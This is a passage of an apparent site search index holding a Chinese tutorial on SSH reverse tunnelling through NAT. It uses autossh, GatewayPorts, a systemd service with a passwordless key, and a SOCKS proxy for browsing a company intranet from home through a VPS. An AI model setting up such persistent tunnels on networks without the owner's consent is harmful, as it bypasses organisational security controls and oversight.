\u6240\u6709\u53ef\u7528\u7684\u53c3\u6578"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/","text":"\u4f7f\u7528SSH\u53cd\u5411\u96a7\u9053\u8fdb\u884c\u5185\u7f51\u7a7f\u900f ================= \u5bf9\u5e94\u7684\u60c5\u51b5 \u8fd9\u7bc7\u6587\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5982\u4f55\u5229\u7528SSH \u53cd\u5411\u96a7\u9053\u7a7f\u900fNAT\uff0c\u5e76\u6f14\u793a\u4e86\u5982\u4f55\u7ef4\u6301\u4e00\u6761\u7a33\u5b9a\u7684SSH \u96a7\u9053\u3002 \u5047\u8bbe\u6709\u673a\u5668A \u548cB\uff0cA \u6709\u516c\u7f51IP\uff0cB \u4f4d\u4e8eNAT \u4e4b\u540e\u5e76\u65e0\u53ef\u7528\u7684\u7aef\u53e3\u8f6c\u53d1\uff0c\u73b0\u5728\u60f3\u7531A \u4e3b\u52a8\u5411B \u53d1\u8d77SSH \u8fde\u63a5\u3002\u7531\u4e8eB \u5728NAT \u540e\u7aef\uff0c\u65e0\u53ef\u7528 \u516c\u7f51IP + \u7aef\u53e3 \u8fd9\u6837\u4e00\u4e2a\u7ec4\u5408\uff0c\u6240\u4ee5A \u65e0\u6cd5\u7a7f\u900fNAT\uff0c\u8fd9\u7bc7\u6587\u7ae0\u5e94\u5bf9\u7684\u5c31\u662f\u8fd9\u79cd\u60c5\u51b5\u3002 \u9996\u5148\u6709\u5982\u4e0b\u7ea6\u5b9a\uff0c\u56e0\u4e3a\u5f88\u91cd\u8981\u6240\u4ee5\u653e\u5728\u524d\u9762\uff1a \u673a\u5668\u4ee3\u53f7 \u673a\u5668\u4f4d\u7f6e \u5730\u5740 \u8d26\u6237 ssh/sshd \u7aef\u53e3 \u662f\u5426\u9700\u8981\u8fd0\u884csshd A \u4f4d\u4e8e\u516c\u7f51 a.site usera 22 \u662f B \u4f4d\u4e8eNAT \u4e4b\u540e localhost userb 22 \u662f C \u4f4d\u4e8eNAT \u4e4b\u540e localhost userc 22 \u5426 \u8fd9\u91cc\u9ed8\u8ba4\u4f60\u7684\u7cfb\u7edfinit \u7a0b\u5e8f\u4e3a systemd \uff0c\u5982\u679c\u4f60\u4f7f\u7528\u5176\u4ed6\u7684init \u7a0b\u5e8f\uff0c\u5982\u679c\u6ca1\u6709\u7279\u6b8a\u7406\u7531\u8fd8\u662f\u6362\u5230\u4e00\u4e2a\u73b0\u4ee3\u5316\u7684GNU/Linux \u7cfb\u7edf\u5427\u2026\u2026 SSH \u53cd\u5411\u96a7\u9053 \u8fd9\u79cd\u624b\u6bb5\u5b9e\u8d28\u4e0a\u662f\u7531B \u5411A \u4e3b\u52a8\u5730\u5efa\u7acb\u4e00\u4e2aSSH \u96a7\u9053\uff0c\u5c06A \u76846766 \u7aef\u53e3\u8f6c\u53d1\u5230B \u768422 \u7aef\u53e3\u4e0a\uff0c\u53ea\u8981\u8fd9\u6761\u96a7\u9053\u4e0d\u5173\u95ed\uff0c\u8fd9\u4e2a\u8f6c\u53d1\u5c31\u662f\u6709\u6548\u7684\u3002\u6709\u4e86\u8fd9\u4e2a\u7aef\u53e3\u8f6c\u53d1\uff0c\u53ea\u9700\u8981\u8bbf\u95eeA \u76846766 \u7aef\u53e3\u53cd\u5411\u8fde\u63a5B \u5373\u53ef\u3002 \u9996\u5148\u5728 B \u4e0a\u5efa\u7acb\u4e00\u4e2aSSH \u96a7\u9053\uff0c\u5c06A \u76846766 \u7aef\u53e3\u8f6c\u53d1\u5230B \u768422 \u7aef\u53e3\u4e0a\uff1a B $ ssh -p 22 -qngfNTR 6766:localhost:22 usera@a.site \u7136\u540e\u5728 A \u4e0a\u5229\u75286766 \u7aef\u53e3\u53cd\u5411SSH \u5230B\uff1a A $ ssh -p 6766 userb@localhost \u8981\u505a\u7684\u4e8b\u60c5\u5176\u5b9e\u5c31\u662f\u8fd9\u4e48\u7b80\u5355\u3002 \u96a7\u9053\u7684\u7ef4\u6301 \u7a33\u5b9a\u6027\u7ef4\u6301 \u7136\u800c\u4e0d\u5e78\u7684\u662fSSH \u8fde\u63a5\u662f\u4f1a\u8d85\u65f6\u5173\u95ed\u7684\uff0c\u5982\u679c\u8fde\u63a5\u5173\u95ed\uff0c\u96a7\u9053\u65e0\u6cd5\u7ef4\u6301\uff0c\u90a3\u4e48A \u5c31\u65e0\u6cd5\u5229\u7528\u53cd\u5411\u96a7\u9053\u7a7f\u900fB \u6240\u5728\u7684NAT \u4e86\uff0c\u4e3a\u6b64\u6211\u4eec\u9700\u8981\u4e00\u79cd\u65b9\u6848\u6765\u63d0\u4f9b\u4e00\u6761\u7a33\u5b9a\u7684SSH \u53cd\u5411\u96a7\u9053\u3002 \u4e00\u4e2a\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f autossh \uff0c\u8fd9\u4e2a\u8f6f\u4ef6\u4f1a\u5728\u8d85\u65f6\u4e4b\u540e\u81ea\u52a8\u91cd\u65b0\u5efa\u7acbSSH \u96a7\u9053\uff0c\u8fd9\u6837\u5c31\u89e3\u51b3\u4e86\u96a7\u9053\u7684\u7a33\u5b9a\u6027\u95ee\u9898\uff0c\u5982\u679c\u4f60\u4f7f\u7528 Arch Linux \uff0c\u4f60\u53ef\u4ee5\u8fd9\u6837\u83b7\u5f97\u5b83\uff1a $ sudo pacman -S autossh \u4e0b\u9762\u5728 B \u4e0a\u505a\u4e4b\u524d\u7c7b\u4f3c\u7684\u4e8b\u60c5\uff0c\u4e0d\u540c\u7684\u662f\u8be5\u96a7\u9053\u4f1a\u7531 autossh \u6765\u7ef4\u6301\uff1a B $ autossh -p 22 -M 6777 -NR 6766:localhost:22 usera@a.site -M \u53c2\u6570\u6307\u5b9a\u7684\u7aef\u53e3\u7528\u6765\u76d1\u542c\u96a7\u9053\u7684\u72b6\u6001\uff0c\u4e0e\u7aef\u53e3\u8f6c\u53d1\u65e0\u5173\u3002 \u4e4b\u540e\u4f60\u53ef\u4ee5\u5728A \u4e0a\u901a\u8fc76766 \u7aef\u53e3\u8bbf\u95eeB \u4e86\uff1a A $ ssh -p 6766 userb@localhost \u96a7\u9053\u7684\u81ea\u52a8\u5efa\u7acb \u7136\u800c\u8fd9\u53c8\u6709\u4e86\u53e6\u5916\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u679cB \u91cd\u542f\u96a7\u9053\u5c31\u4f1a\u6d88\u5931\u3002\u90a3\u4e48\u9700\u8981\u6709\u4e00\u79cd\u624b\u6bb5\u5728B \u6bcf\u6b21\u542f\u52a8\u65f6\u4f7f\u7528 autossh \u6765\u5efa\u7acbSSH \u96a7\u9053\u3002\u5f88\u81ea\u7136\u7684\u4e00\u4e2a\u60f3\u6cd5\u5c31\u662f\u505a\u6210\u670d\u52a1\uff0c\u4e4b\u540e\u4f1a\u7ed9\u51fa\u5728 systemd \u4e0b\u7684\u4e00\u79cd\u89e3\u51b3\u65b9\u6848\u3002 \u201c\u6253\u6d1e\u201d \u4e4b\u6240\u4ee5\u6807\u9898\u8fd9\u4e48\u8d77\uff0c\u662f\u56e0\u4e3a\u81ea\u5df1\u89c9\u5f97\u8fd9\u4ef6\u4e8b\u60c5\u6709\u70b9\u7c7b\u4f3c\u4e8eUDP \u6253\u6d1e\uff0c\u5373\u901a\u8fc7\u4e00\u53f0\u5728\u516c\u7f51\u7684\u673a\u5668\uff0c\u8ba9\u4e24\u53f0\u5206\u522b\u4f4d\u4e8e\u5404\u81eaNAT \u4e4b\u540e\u7684\u673a\u5668\u53ef\u4ee5\u5efa\u7acbSSH \u8fde\u63a5\u3002 \u4e0b\u9762\u6f14\u793a\u5982\u4f55\u4f7f\u7528SSH \u53cd\u5411\u96a7\u9053\uff0c\u8ba9C \u8fde\u63a5\u5230B\u3002 \u9996\u5148\u5728 A \u4e0a\u7f16\u8f91 sshd \u7684\u914d\u7f6e\u6587\u4ef6 /etc/ssh/sshd_config \uff0c\u5c06 GatewayPorts \u5f00\u5173\u6253\u5f00\uff1a GatewayPorts yes \u7136\u540e\u91cd\u542f sshd \uff1a A $ sudo systemctl restart sshd \u7136\u540e\u5728 B \u4e0a\u5bf9\u4e4b\u524d\u7528\u5230\u7684 autossh \u6307\u4ee4\u7565\u52a0\u4fee\u6539\uff1a B $ autossh -p 22 -M 6777 -NR '*:6766:localhost:22' usera@a.site \u4e4b\u540e\u5728 C \u4e0a\u5229\u7528 A \u76846766 \u7aef\u53e3SSH \u8fde\u63a5\u5230 B \uff1a C $ ssh -p 6766 userb@a.site \u81f3\u6b64\u4f60\u5df2\u7ecf\u8f7b\u800c\u6613\u4e3e\u7684\u7a7f\u900f\u4e86\u4e24\u5c42NAT\u3002 \u6700\u7ec8\u7684\u89e3\u51b3\u65b9\u6848 \u6574\u5408\u4e00\u4e0b\u524d\u9762\u63d0\u5230\u7684\uff0c\u6700\u7ec8\u7684\u89e3\u51b3\u65b9\u6848\u5982\u4e0b\uff1a \u9996\u5148\u6253\u5f00 A \u4e0a sshd \u7684 GatewayPorts \u5f00\u5173\uff0c\u5e76\u91cd\u542f sshd \uff08\u5982\u6709\u9700\u8981\uff09\u3002 \u7136\u540e\u5728 B \u4e0a\u65b0\u5efa\u4e00\u4e2a\u7528\u6237 autossh \uff0c\u6839\u636e\u6743\u9650\u6700\u5c0f\u5316\u601d\u60f3\uff0cB \u4e0a\u7684 autossh \u670d\u52a1\u5c06\u4ee5 autossh \u7528\u6237\u7684\u8eab\u4efd\u8fd0\u884c\uff0c\u4ee5\u5c3d\u5927\u53ef\u80fd\u907f\u514d\u51fa\u73b0\u5b89\u5168\u95ee\u9898\uff1a B $ sudo useradd -m autosshB $ sudo passwd autossh \u7d27\u63a5\u7740\u5728 B \u4e0a\u4e3a autossh \u7528\u6237\u521b\u5efaSSH \u5bc6\u94a5\uff0c\u5e76\u4e0a\u4f20\u5230A\uff1a B $ su - autosshB $ ssh-keygen -t 'rsa' -C 'autossh@B'B $ ssh-copy-id usera@a.site \u6ce8\u610f\u8be5 \u5bc6\u94a5\u4e0d\u8981\u8bbe\u7f6e\u5bc6\u7801 \uff0c\u4e5f\u5c31\u662f\u8fd0\u884c ssh-keygen \u6307\u4ee4\u65f6\u5c3d\u7ba1\u4e00\u8def\u56de\u8f66\uff0c\u4e0d\u8981\u8f93\u5165\u989d\u5916\u7684\u5b57\u7b26\u3002 \u7136\u540e\u5728 B \u4e0a\u521b\u5efa\u4ee5 autossh \u7528\u6237\u6743\u9650\u8c03\u7528 autossh \u7684service \u6587\u4ef6\u3002\u5c06\u4e0b\u9762\u6587\u672c\u5199\u5165\u5230\u6587\u4ef6 /lib/systemd/system/autossh.service \uff0c\u5e76\u8bbe\u7f6e\u6743\u9650\u4e3a644\uff1a [Unit]Description=Auto SSH TunnelAfter=network-online.target[Service]User=autosshType=simpleExecStart=/bin/autossh -p 22 -M 6777 -NR '*:6766:localhost:22' usera@a.site -i /home/autossh/.ssh/id_rsaExecReload=/bin/kill -HUP $MAINPIDKillMode=processRestart=always[Install]WantedBy=multi-user.targetWantedBy=graphical.target \u5728B \u4e0a\u8ba9 network-online.target \u751f\u6548\uff1a B $ systemctl enable NetworkManager-wait-online \u5982\u679c\u4f60\u4f7f\u7528 systemd-networkd \uff0c\u4f60\u9700\u8981\u542f\u7528\u7684\u670d\u52a1\u5219\u5e94\u5f53\u662f systemd-networkd-wait-online \u3002 \u7136\u540e\u8bbe\u7f6e\u8be5\u670d\u52a1\u81ea\u52a8\u542f\u52a8\uff1a B $ sudo systemctl enable autossh \u5982\u679c\u4f60\u613f\u610f\uff0c\u5728\u8fd9\u4e4b\u540e\u53ef\u4ee5\u7acb\u523b\u542f\u52a8\u5b83\uff1a B $ sudo systemctl start autossh \u7136\u540e\u4f60\u53ef\u4ee5\u5728 A \u4e0a\u4f7f\u7528\u8fd9\u6761\u53cd\u5411\u96a7\u9053\u7a7f\u900fB \u6240\u5728\u7684NAT SSH \u8fde\u63a5\u5230B\uff1a A $ ssh -p 6766 userb@localhost \u6216\u8005\u662f\u5728 C \u4e0a\u76f4\u63a5\u7a7f\u900f\u4e24\u5c42NAT SSH \u8fde\u63a5\u5230B\uff1a C $ ssh -p 6766 userb@a.site \u5982\u679c\u4f60\u5bf9SSH \u8db3\u591f\u719f\u6089\uff0c\u4f60\u53ef\u4ee5\u5229\u7528\u8fd9\u6761\u96a7\u9053\u505a\u66f4\u591a\u7684\u4e8b\u60c5\uff0c\u4f8b\u5982\u4f60\u53ef\u4ee5\u5728\u53cd\u5411\u8fde\u63a5\u65f6\u6307\u5b9a\u52a8\u6001\u7aef\u53e3\u8f6c\u53d1\uff1a C $ ssh -p 6766 -qngfNTD 7677 userb@a.site \u5047\u8bbe C \u662f\u4f60\u5bb6\u4e2d\u7684\u7535\u8111\uff0c A \u662f\u4f60\u7684VPS\uff0c B \u662f\u4f60\u516c\u53f8\u7684\u7535\u8111\u3002\u5982\u679c\u4f60\u8fd9\u6837\u505a\u4e86\uff0c\u90a3\u4e48\u4e3a\u6d4f\u89c8\u5668\u8bbe\u7f6e\u7aef\u53e3\u4e3a 7677 \u7684 sock4 \u672c\u5730\uff08localhost\uff09\u4ee3\u7406\u540e\uff0c\u4f60\u5c31\u53ef\u4ee5\u5728\u5bb6\u91cc\u7684\u6d4f\u89c8\u5668\u4e0a\u770b\u5230\u516c\u53f8\u5185\u7f51\u7684\u7f51\u9875\u3002 \u672c\u6587\u6807\u9898: \u4f7f\u7528SSH\u53cd\u5411\u96a7\u9053\u8fdb\u884c\u5185\u7f51\u7a7f\u900f \u539f\u6587\u94fe\u63a5\uff1a http://arondight.me/2016/02/17/\u4f7f\u7528SSH\u53cd\u5411\u96a7\u9053\u8fdb\u884c\u5185\u7f51\u7a7f\u900f/","title":"\u4f7f\u7528SSH\u53cd\u5411\u96a7\u9053\u8fdb\u884c\u5185\u7f51\u7a7f\u900f"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#ssh","text":"=================","title":"\u4f7f\u7528SSH\u53cd\u5411\u96a7\u9053\u8fdb\u884c\u5185\u7f51\u7a7f\u900f"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#_1","text":"\u8fd9\u7bc7\u6587\u7ae0\u4e3b\u8981\u4ecb\u7ecd\u4e86\u5982\u4f55\u5229\u7528SSH \u53cd\u5411\u96a7\u9053\u7a7f\u900fNAT\uff0c\u5e76\u6f14\u793a\u4e86\u5982\u4f55\u7ef4\u6301\u4e00\u6761\u7a33\u5b9a\u7684SSH \u96a7\u9053\u3002 \u5047\u8bbe\u6709\u673a\u5668A \u548cB\uff0cA \u6709\u516c\u7f51IP\uff0cB \u4f4d\u4e8eNAT \u4e4b\u540e\u5e76\u65e0\u53ef\u7528\u7684\u7aef\u53e3\u8f6c\u53d1\uff0c\u73b0\u5728\u60f3\u7531A \u4e3b\u52a8\u5411B \u53d1\u8d77SSH \u8fde\u63a5\u3002\u7531\u4e8eB \u5728NAT \u540e\u7aef\uff0c\u65e0\u53ef\u7528 \u516c\u7f51IP + \u7aef\u53e3 \u8fd9\u6837\u4e00\u4e2a\u7ec4\u5408\uff0c\u6240\u4ee5A \u65e0\u6cd5\u7a7f\u900fNAT\uff0c\u8fd9\u7bc7\u6587\u7ae0\u5e94\u5bf9\u7684\u5c31\u662f\u8fd9\u79cd\u60c5\u51b5\u3002 \u9996\u5148\u6709\u5982\u4e0b\u7ea6\u5b9a\uff0c\u56e0\u4e3a\u5f88\u91cd\u8981\u6240\u4ee5\u653e\u5728\u524d\u9762\uff1a \u673a\u5668\u4ee3\u53f7 \u673a\u5668\u4f4d\u7f6e \u5730\u5740 \u8d26\u6237 ssh/sshd \u7aef\u53e3 \u662f\u5426\u9700\u8981\u8fd0\u884csshd A \u4f4d\u4e8e\u516c\u7f51 a.site usera 22 \u662f B \u4f4d\u4e8eNAT \u4e4b\u540e localhost userb 22 \u662f C \u4f4d\u4e8eNAT \u4e4b\u540e localhost userc 22 \u5426 \u8fd9\u91cc\u9ed8\u8ba4\u4f60\u7684\u7cfb\u7edfinit \u7a0b\u5e8f\u4e3a systemd \uff0c\u5982\u679c\u4f60\u4f7f\u7528\u5176\u4ed6\u7684init \u7a0b\u5e8f\uff0c\u5982\u679c\u6ca1\u6709\u7279\u6b8a\u7406\u7531\u8fd8\u662f\u6362\u5230\u4e00\u4e2a\u73b0\u4ee3\u5316\u7684GNU/Linux \u7cfb\u7edf\u5427\u2026\u2026","title":"\u5bf9\u5e94\u7684\u60c5\u51b5"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#ssh_1","text":"\u8fd9\u79cd\u624b\u6bb5\u5b9e\u8d28\u4e0a\u662f\u7531B \u5411A \u4e3b\u52a8\u5730\u5efa\u7acb\u4e00\u4e2aSSH \u96a7\u9053\uff0c\u5c06A \u76846766 \u7aef\u53e3\u8f6c\u53d1\u5230B \u768422 \u7aef\u53e3\u4e0a\uff0c\u53ea\u8981\u8fd9\u6761\u96a7\u9053\u4e0d\u5173\u95ed\uff0c\u8fd9\u4e2a\u8f6c\u53d1\u5c31\u662f\u6709\u6548\u7684\u3002\u6709\u4e86\u8fd9\u4e2a\u7aef\u53e3\u8f6c\u53d1\uff0c\u53ea\u9700\u8981\u8bbf\u95eeA \u76846766 \u7aef\u53e3\u53cd\u5411\u8fde\u63a5B \u5373\u53ef\u3002 \u9996\u5148\u5728 B \u4e0a\u5efa\u7acb\u4e00\u4e2aSSH \u96a7\u9053\uff0c\u5c06A \u76846766 \u7aef\u53e3\u8f6c\u53d1\u5230B \u768422 \u7aef\u53e3\u4e0a\uff1a B $ ssh -p 22 -qngfNTR 6766:localhost:22 usera@a.site \u7136\u540e\u5728 A \u4e0a\u5229\u75286766 \u7aef\u53e3\u53cd\u5411SSH \u5230B\uff1a A $ ssh -p 6766 userb@localhost \u8981\u505a\u7684\u4e8b\u60c5\u5176\u5b9e\u5c31\u662f\u8fd9\u4e48\u7b80\u5355\u3002","title":"SSH \u53cd\u5411\u96a7\u9053"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#_2","text":"","title":"\u96a7\u9053\u7684\u7ef4\u6301"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#_3","text":"\u7136\u800c\u4e0d\u5e78\u7684\u662fSSH \u8fde\u63a5\u662f\u4f1a\u8d85\u65f6\u5173\u95ed\u7684\uff0c\u5982\u679c\u8fde\u63a5\u5173\u95ed\uff0c\u96a7\u9053\u65e0\u6cd5\u7ef4\u6301\uff0c\u90a3\u4e48A \u5c31\u65e0\u6cd5\u5229\u7528\u53cd\u5411\u96a7\u9053\u7a7f\u900fB \u6240\u5728\u7684NAT \u4e86\uff0c\u4e3a\u6b64\u6211\u4eec\u9700\u8981\u4e00\u79cd\u65b9\u6848\u6765\u63d0\u4f9b\u4e00\u6761\u7a33\u5b9a\u7684SSH \u53cd\u5411\u96a7\u9053\u3002 \u4e00\u4e2a\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f autossh \uff0c\u8fd9\u4e2a\u8f6f\u4ef6\u4f1a\u5728\u8d85\u65f6\u4e4b\u540e\u81ea\u52a8\u91cd\u65b0\u5efa\u7acbSSH \u96a7\u9053\uff0c\u8fd9\u6837\u5c31\u89e3\u51b3\u4e86\u96a7\u9053\u7684\u7a33\u5b9a\u6027\u95ee\u9898\uff0c\u5982\u679c\u4f60\u4f7f\u7528 Arch Linux \uff0c\u4f60\u53ef\u4ee5\u8fd9\u6837\u83b7\u5f97\u5b83\uff1a $ sudo pacman -S autossh \u4e0b\u9762\u5728 B \u4e0a\u505a\u4e4b\u524d\u7c7b\u4f3c\u7684\u4e8b\u60c5\uff0c\u4e0d\u540c\u7684\u662f\u8be5\u96a7\u9053\u4f1a\u7531 autossh \u6765\u7ef4\u6301\uff1a B $ autossh -p 22 -M 6777 -NR 6766:localhost:22 usera@a.site -M \u53c2\u6570\u6307\u5b9a\u7684\u7aef\u53e3\u7528\u6765\u76d1\u542c\u96a7\u9053\u7684\u72b6\u6001\uff0c\u4e0e\u7aef\u53e3\u8f6c\u53d1\u65e0\u5173\u3002 \u4e4b\u540e\u4f60\u53ef\u4ee5\u5728A \u4e0a\u901a\u8fc76766 \u7aef\u53e3\u8bbf\u95eeB \u4e86\uff1a A $ ssh -p 6766 userb@localhost","title":"\u7a33\u5b9a\u6027\u7ef4\u6301"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#_4","text":"\u7136\u800c\u8fd9\u53c8\u6709\u4e86\u53e6\u5916\u4e00\u4e2a\u95ee\u9898\uff0c\u5982\u679cB \u91cd\u542f\u96a7\u9053\u5c31\u4f1a\u6d88\u5931\u3002\u90a3\u4e48\u9700\u8981\u6709\u4e00\u79cd\u624b\u6bb5\u5728B \u6bcf\u6b21\u542f\u52a8\u65f6\u4f7f\u7528 autossh \u6765\u5efa\u7acbSSH \u96a7\u9053\u3002\u5f88\u81ea\u7136\u7684\u4e00\u4e2a\u60f3\u6cd5\u5c31\u662f\u505a\u6210\u670d\u52a1\uff0c\u4e4b\u540e\u4f1a\u7ed9\u51fa\u5728 systemd \u4e0b\u7684\u4e00\u79cd\u89e3\u51b3\u65b9\u6848\u3002","title":"\u96a7\u9053\u7684\u81ea\u52a8\u5efa\u7acb"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#_5","text":"\u4e4b\u6240\u4ee5\u6807\u9898\u8fd9\u4e48\u8d77\uff0c\u662f\u56e0\u4e3a\u81ea\u5df1\u89c9\u5f97\u8fd9\u4ef6\u4e8b\u60c5\u6709\u70b9\u7c7b\u4f3c\u4e8eUDP \u6253\u6d1e\uff0c\u5373\u901a\u8fc7\u4e00\u53f0\u5728\u516c\u7f51\u7684\u673a\u5668\uff0c\u8ba9\u4e24\u53f0\u5206\u522b\u4f4d\u4e8e\u5404\u81eaNAT \u4e4b\u540e\u7684\u673a\u5668\u53ef\u4ee5\u5efa\u7acbSSH \u8fde\u63a5\u3002 \u4e0b\u9762\u6f14\u793a\u5982\u4f55\u4f7f\u7528SSH \u53cd\u5411\u96a7\u9053\uff0c\u8ba9C \u8fde\u63a5\u5230B\u3002 \u9996\u5148\u5728 A \u4e0a\u7f16\u8f91 sshd \u7684\u914d\u7f6e\u6587\u4ef6 /etc/ssh/sshd_config \uff0c\u5c06 GatewayPorts \u5f00\u5173\u6253\u5f00\uff1a GatewayPorts yes \u7136\u540e\u91cd\u542f sshd \uff1a A $ sudo systemctl restart sshd \u7136\u540e\u5728 B \u4e0a\u5bf9\u4e4b\u524d\u7528\u5230\u7684 autossh \u6307\u4ee4\u7565\u52a0\u4fee\u6539\uff1a B $ autossh -p 22 -M 6777 -NR '*:6766:localhost:22' usera@a.site \u4e4b\u540e\u5728 C \u4e0a\u5229\u7528 A \u76846766 \u7aef\u53e3SSH \u8fde\u63a5\u5230 B \uff1a C $ ssh -p 6766 userb@a.site \u81f3\u6b64\u4f60\u5df2\u7ecf\u8f7b\u800c\u6613\u4e3e\u7684\u7a7f\u900f\u4e86\u4e24\u5c42NAT\u3002","title":"\u201c\u6253\u6d1e\u201d"},{"location":"RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/#_6","text":"\u6574\u5408\u4e00\u4e0b\u524d\u9762\u63d0\u5230\u7684\uff0c\u6700\u7ec8\u7684\u89e3\u51b3\u65b9\u6848\u5982\u4e0b\uff1a \u9996\u5148\u6253\u5f00 A \u4e0a sshd \u7684 GatewayPorts \u5f00\u5173\uff0c\u5e76\u91cd\u542f sshd \uff08\u5982\u6709\u9700\u8981\uff09\u3002 \u7136\u540e\u5728 B \u4e0a\u65b0\u5efa\u4e00\u4e2a\u7528\u6237 autossh \uff0c\u6839\u636e\u6743\u9650\u6700\u5c0f\u5316\u601d\u60f3\uff0cB \u4e0a\u7684 autossh \u670d\u52a1\u5c06\u4ee5 autossh \u7528\u6237\u7684\u8eab\u4efd\u8fd0\u884c\uff0c\u4ee5\u5c3d\u5927\u53ef\u80fd\u907f\u514d\u51fa\u73b0\u5b89\u5168\u95ee\u9898\uff1a B $ sudo useradd -m autosshB $ sudo passwd autossh \u7d27\u63a5\u7740\u5728 B \u4e0a\u4e3a autossh \u7528\u6237\u521b\u5efaSSH \u5bc6\u94a5\uff0c\u5e76\u4e0a\u4f20\u5230A\uff1a B $ su - autosshB $ ssh-keygen -t 'rsa' -C 'autossh@B'B $ ssh-copy-id usera@a.site \u6ce8\u610f\u8be5 \u5bc6\u94a5\u4e0d\u8981\u8bbe\u7f6e\u5bc6\u7801 \uff0c\u4e5f\u5c31\u662f\u8fd0\u884c ssh-keygen \u6307\u4ee4\u65f6\u5c3d\u7ba1\u4e00\u8def\u56de\u8f66\uff0c\u4e0d\u8981\u8f93\u5165\u989d\u5916\u7684\u5b57\u7b26\u3002 \u7136\u540e\u5728 B \u4e0a\u521b\u5efa\u4ee5 autossh \u7528\u6237\u6743\u9650\u8c03\u7528 autossh \u7684service \u6587\u4ef6\u3002\u5c06\u4e0b\u9762\u6587\u672c\u5199\u5165\u5230\u6587\u4ef6 /lib/systemd/system/autossh.service \uff0c\u5e76\u8bbe\u7f6e\u6743\u9650\u4e3a644\uff1a [Unit]Description=Auto SSH TunnelAfter=network-online.target[Service]User=autosshType=simpleExecStart=/bin/autossh -p 22 -M 6777 -NR '*:6766:localhost:22' usera@a.site -i /home/autossh/.ssh/id_rsaExecReload=/bin/kill -HUP $MAINPIDKillMode=processRestart=always[Install]WantedBy=multi-user.targetWantedBy=graphical.target \u5728B \u4e0a\u8ba9 network-online.target \u751f\u6548\uff1a B $ systemctl enable NetworkManager-wait-online \u5982\u679c\u4f60\u4f7f\u7528 systemd-networkd \uff0c\u4f60\u9700\u8981\u542f\u7528\u7684\u670d\u52a1\u5219\u5e94\u5f53\u662f systemd-networkd-wait-online \u3002 \u7136\u540e\u8bbe\u7f6e\u8be5\u670d\u52a1\u81ea\u52a8\u542f\u52a8\uff1a B $ sudo systemctl enable autossh \u5982\u679c\u4f60\u613f\u610f\uff0c\u5728\u8fd9\u4e4b\u540e\u53ef\u4ee5\u7acb\u523b\u542f\u52a8\u5b83\uff1a B $ sudo systemctl start autossh \u7136\u540e\u4f60\u53ef\u4ee5\u5728 A \u4e0a\u4f7f\u7528\u8fd9\u6761\u53cd\u5411\u96a7\u9053\u7a7f\u900fB \u6240\u5728\u7684NAT SSH \u8fde\u63a5\u5230B\uff1a A $ ssh -p 6766 userb@localhost \u6216\u8005\u662f\u5728 C \u4e0a\u76f4\u63a5\u7a7f\u900f\u4e24\u5c42NAT SSH \u8fde\u63a5\u5230B\uff1a C $ ssh -p 6766 userb@a.site \u5982\u679c\u4f60\u5bf9SSH \u8db3\u591f\u719f\u6089\uff0c\u4f60\u53ef\u4ee5\u5229\u7528\u8fd9\u6761\u96a7\u9053\u505a\u66f4\u591a\u7684\u4e8b\u60c5\uff0c\u4f8b\u5982\u4f60\u53ef\u4ee5\u5728\u53cd\u5411\u8fde\u63a5\u65f6\u6307\u5b9a\u52a8\u6001\u7aef\u53e3\u8f6c\u53d1\uff1a C $ ssh -p 6766 -qngfNTD 7677 userb@a.site \u5047\u8bbe C \u662f\u4f60\u5bb6\u4e2d\u7684\u7535\u8111\uff0c A \u662f\u4f60\u7684VPS\uff0c B \u662f\u4f60\u516c\u53f8\u7684\u7535\u8111\u3002\u5982\u679c\u4f60\u8fd9\u6837\u505a\u4e86\uff0c\u90a3\u4e48\u4e3a\u6d4f\u89c8\u5668\u8bbe\u7f6e\u7aef\u53e3\u4e3a 7677 \u7684 sock4 \u672c\u5730\uff08localhost\uff09\u4ee3\u7406\u540e\uff0c\u4f60\u5c31\u53ef\u4ee5\u5728\u5bb6\u91cc\u7684\u6d4f\u89c8\u5668\u4e0a\u770b\u5230\u516c\u53f8\u5185\u7f51\u7684\u7f51\u9875\u3002 \u672c\u6587\u6807\u9898: \u4f7f\u7528SSH\u53cd\u5411\u96a7\u9053\u8fdb\u884c\u5185\u7f51\u7a7f\u900f \u539f\u6587\u94fe\u63a5\uff1a 